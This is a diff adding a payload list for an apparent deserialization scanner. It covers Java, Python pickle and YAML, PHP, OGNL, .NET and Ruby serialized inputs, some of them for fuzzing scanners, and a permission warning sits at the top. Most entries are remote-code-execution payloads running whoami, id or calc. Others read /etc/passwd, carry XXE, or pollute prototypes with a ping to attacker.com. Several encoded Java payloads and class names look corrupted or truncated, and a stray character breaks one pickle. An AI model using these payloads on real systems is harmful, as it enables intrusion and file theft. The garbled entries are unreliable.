@@ -1,0 +1,293 @@
+# Deserialization Attack Payloads
+# ============================================================================
+# Warden v0.8.0 Enterprise Edition - Deserialization Scanner
+# ============================================================================
+
+# WARNING: These payloads can cause Remote Code Execution (RCE).
+# Use only on systems you own or have permission to test.
+
+# ============================================================================
+# JAVA DESERIALIZATION (Apache Commons Collections, ysoserial, Spring, XStream)
+# ============================================================================
+
+# Apache Commons Collections (CVE-2015-4852)
+rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwABmNvbXBhcmF0b3J0ABBMamF2YS91dGlsL0NvbXBhcmF0b3I7eHBzcgAXamF2YS5sYW5nLkF1dG9tb3JwaGljh4j MCCSYAIAAUwABW1pbGV0AAZTZXJpYWx1aWQABExJQVoAABJO
+
+# ysoserial CommonsCollections1
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAA/AAAA
+
+# ysoserial CommonsCollections2
+rO0ABXNyADJjb20uc3VuLm9yZy5hd2NoZS5zeG1sLmludGVybmFsLkRlY2ltYWxTZXJ2aWNlJE1hbmlwdWxhdGlvbkVudHJ5TXV0YXRpb25JdGVyYXRvcngAAAAAAAAAAICAAB4cgAoamF2YS51dGlsLkNvbGxlY3Rpb25zJFN5bmNocm9uaXplZE1hcCRNZXRhSWRlcY++dlHcBRwAwAADTAHRoaXMAAAAAAAAAAB4=
+
+# ysoserial CommonsCollections3
+rO0ABXNyADJjb20uc3VuLm9yZy5hd2NoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF5LlRyYXlUeXBlSW1wbEAAAAAAABdMAAh0aHVzAAAAAAAAAAB4cgA0amF2YS5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheS5UcmF5VHlwZUltcGwAAAAAAAAAAgIAAHhxAH4ABAAAAABzcgAjY29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLmRvbS5DbGFzc0RlZmluaXRpb24AAAAAAAAAAAECAAFMAARhY2Nlc3NzdAAQTGphdmEvbGFuZy9DbGFzczt4cHNyACJvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXAkUHJveHkAAAAAAAAAAQIAAHhw
+
+# ROME library payload
+rO0ABXNyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5WiQ4ZDRhNTNmYQIAAUwABWtleXQAE1tMamF2YS9sYW5nL09iamVjdDtMAANtYXB0ABNMamF2YS91dGlsL01hcDt4cHNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UcmF5aXRlbml0aXphdGlvbkV4Y2VwdGlvbjAaD6iY0bJcAgABTAAHZXJyb3JzdAATTGphdmEvdXRpbC9MaXN0O3hwc3IAK2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy5UcmF5
+
+# Spring Framework deserialization
+rO0ABXNyADdvcmdzcmluZ2ZyYW1ld29yay5zZWN1cml0eS5jb250ZXh0LlVzZXJSb2xlVjJMaXN0CTI1YzMwZjk2AgAAWgAFc291cmNldAAzTG9yZ3Mvc3ByaW5nZnJhbWV3b3JrL3NlY3VyaXR5L2NvbnRleHQvVXNlclJvbGU7eHBxAH4AAgAAAAAA
+
+# XStream XML payload
+<sorted-set><string>test</string><dynamic-proxy><interface>java.lang.Comparable</interface><handler class="sun.reflect.annotation.AnnotationInvocationHandler"><member-sets><map><entry><string>foo</string><string>bar</string></entry></map></member-sets></handler></dynamic-proxy></sorted-set>
+
+# JRMP exploitation
+rO0ABXNyABdqYXZhLnJtaS5zZXJ2ZXIuUmVtb3RlT2JqZWN0AAAAAAAAAAAAAAA
+
+# JSON gadget chain for Java
+{"cmd":"calc.exe","map":{"class":"org.apache.commons.collections.map.LazyMap"}}
+
+# JSON payload for Spring
+{"redirect":"http://127.0.0.1:8080/admin"}
+
+# ============================================================================
+# PYTHON PICKLE (pickle, shelve, marshal, dill)
+# ============================================================================
+
+# Basic pickle with __reduce__ (RCE)
+g尐
+(S'ls'
+tR.
+
+cos
+system
+(S'whoami'
+tR.
+
+# Pickle with subprocess
+csubprocess
+check_output
+(S'whoami'
+tR.
+
+# Pickle protocol 2
+(dp0
+S'command'
+p1
+S'whoami'
+p2
+s.
+
+# Pickle with base64
+Y29zCnN5c3RlbQooUydoZ2hsbWUnCnRS
+
+# Pickle with eval
+(S'__import__(\"os\").system(\"id\")'
+i__builtin__
+eval
+.
+
+# Dill payload
+dill
+_loads
+(gapply
+(cos
+subprocess
+check_output
+(S'ls -la'
+tRtR.
+
+# Marshal payload
+eJwBLgQ2/2QAAABhbgA=
+
+# Shelve format
+('shelfvalue', p0
+(dp1
+S'test'
+p2
+.
+
+# ============================================================================
+# PYTHON YAML (PyYAML unsafe)
+# ============================================================================
+
+!!python/object/apply:os.system
+args: ['whoami']
+
+!!python/object/new:os.system
+args: ['id']
+
+!!python/module:os.system
+args: ['uname']
+
+!!python/object/apply:subprocess.check_output
+args: [['whoami']]
+
+!!python/object/apply:eval
+args: ['__import__("os").system("id")']
+
+!!python/object/apply:__import__
+args: ['os', 'system', 'whoami']
+
+# ============================================================================
+# PHP UNSERIALIZE (SoapClient, Laravel, Symfony)
+# ============================================================================
+
+O:8:"stdClass":0:{}
+
+O:10:"SoapClient":3:{s:3:"uri";s:10:"http://test";s:8:"location";s:25:"http://127.0.0.1:8080/test";s:13:"_soap_version";i:1;}
+
+O:8:"stdClass":1:{s:4:"test";N;}
+
+O:40:"Illuminate\\Foundation\\Application":0:{}
+
+O:32:"Illuminate\\Broadcasting\\PendingBroadcast":0:{}
+
+O:37:"Symfony\\Component\\Cache\\CacheItem":0:{}
+
+O:40:"Symfony\\Component\\HttpKernel\\Controller\\ControllerResolver":0:{}
+
+O:17:"Phar":0:{S:19:"";O:8:"stdClass":0:{}}
+
+O:27:"Monolog\\Handler\\SyslogHandler":0:{}
+
+O:24:"GuzzleHttp\\Psr7\\Request":0:{}
+
+O:7:"Process":1:{s:5:"cmd";s:6:"whoami";}
+
+a:1:{i:0;O:8:"stdClass":0:{}}
+
+O:17:"DirectoryIterator":1:{s:4:"path";s:1:".";}
+
+O:13:"SplFileObject":2:{s:8:"filename";s:11:"/etc/passwd";s:7:"open_mode";s:1:"r";}
+
+O:10:"SoapClient":3:{s:3:"uri";s:10:"http://test";s:8:"location";s:25:"http://127.0.0.1:8080/test";s:13:"_soap_version";i:1;s:13:"__soap_headers";a:1:{i:0;O:9:"SoapHeader":2:{s:6:"";s:2:"";s:5:"";s:2:"";}}}
+
+O:3:"Obj":1:{s:4:"file";s:11:"/etc/passwd";}
+
+O:25:"SimpleXMLElement":2:{s:16:"__construct";a:1:{i:0;s:58:"<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>";}}
+
+O:14:"SplDoublyLinkedList":2:{i:0;:s:3:"";s:13:"SplObjectStorage";}
+
+# ============================================================================
+# JSON/YAML PROTOTYPE POLLUTION
+# ============================================================================
+
+{"__proto__":{"isAdmin":true}}
+
+{"constructor":{"prototype":{"isAdmin":true}}}
+
+{"__proto__":{"shell":"ping -c 1 attacker.com"}}
+
+{"a":"b"}__proto__[isAdmin]=true
+
+{"__proto__":{"toString":"alert(1)"}}
+
+{"__proto__":{" polluted":"yes"}}
+
+{"constructor":{"prototype":{" polluted":"yes"}}}
+
+{"__proto__":{"output":"test","polluted":"true"}}
+
+---
+!!map
+__proto__:
+  isAdmin: true
+
+---
+!ruby/hash:ActionController::Parameters
+allowed?: true
+isAdmin: true
+
+---
+!!python/object/apply:subprocess.check_output
+args: [['whoami']]
+
+!!python/object/apply:eval
+args: ['__import__("os").system("id")']
+
+# ============================================================================
+# OGNL INJECTION (Struts, Confluence, WebWork)
+# ============================================================================
+
+#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec('calc.exe')
+
+%{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec('calc.exe')}
+
+#context['xwork.MethodAccessor.denyMethodExecution']=false,#_memberAccess.allowStaticMethodAccess=true,#cmd='whoami',#ret=@java.lang.Runtime@getRuntime().exec(#cmd),#s=new java.io.Scanner(#ret.getInputStream()).useDelimiter('\\A'),#str=#s.hasNext()?#s.next():'',#str
+
+@java.lang.System@getenv()
+
+@java.lang.Class@forName('java.lang.Runtime')
+
+@java.lang.Runtime@getRuntime().exec('whoami')
+
+#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']
+
+#container=#context['com.opensymphony.xwork2.ActionContext.container'],#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class),#ognlUtil.getRuntime()]
+
+%{#req=@com.opensymphony.webwork.ServletActionContext@getRequest(),#resp=#req.getResponse(),#resp.setCharacterEncoding('UTF-8'),#resp.getWriter().print('test')}
+
+(#_memberAccess[@java.lang.System@setProperty('org.apache.commons.collections.enableUnsafeHeader','true')])
+
+%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.setExcludedClasses('')).(#ou.setExcludedPackageNames(''))}
+
+# ============================================================================
+# .NET DESERIALIZATION (BinaryFormatter, LosFormatter, JavaScriptSerializer)
+# ============================================================================
+
+AAEAAAD/////AQAAAAAAAAAMAgAAAE5TeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy
+
+/wEYAgIAAAAPRKY+gSQtlqTUpb+O
+
+{"__type":"System.Data.DataSet, System.Data"}
+
+AAECAgAAAAA=
+
+{"__type":"System.Management.Automation.PSObject, System.Management.Automation","Members":[{"TypeName":"System.Diagnostics.Process","MemberType":8,"Value":{"StartInfo":{"FileName":"cmd.exe","Arguments":"/c calc"}}}]}
+
+{"__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35","MethodName":"Start","ObjectInstance":{"__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","StartInfo":{"__type":"System.Diagnostics.ProcessStartInfo","FileName":"cmd","Arguments":"/c calc"}}}
+
+AAEAAAD/////
+
+{"IsAdmin":true,"__type":"System.Configuration.ConfigurationSection"}
+
+# ============================================================================
+# RUBY MARSHAL
+# ============================================================================
+
+BAhvOg==
+
+BAgAAgxzdHJpbmc=
+
+BAgJMAHsic29tZSI6ImRhdGEifQ==
+
+\x04\x08o:@ActiveSupport::DeprecationProxy\x00T
+
+\x04\x08o:@ERB\x07T
+
+\x04\x08I:\x0E@symbol_table
+
+\x04\x08o:\x1EActiveSupport::Duration
+
+# ============================================================================
+# COMMON SERIALIZED HEADERS/COOKIES
+# ============================================================================
+
+Cookie: session=O:8:"stdClass":0:{}
+
+Cookie: user=gASV
+
+Cookie: data=rO0AB
+
+Cookie: auth=H4sIA
+
+X-Serialized: rO0ABXNy
+
+X-Object: pickle_data
+
+X-Pickle: cos\nsystem
+
+# ============================================================================
+# CONTENT-TYPE HEADERS FOR TESTING
+# ============================================================================
+
+Content-Type: application/x-java-serialized-object
+
+Content-Type: application/x-python-serialize
+
+Content-Type: application/vnd.php.serialized
+
+Content-Type: application/octet-stream
+
+Content-Type: application/x-ruby-marshal
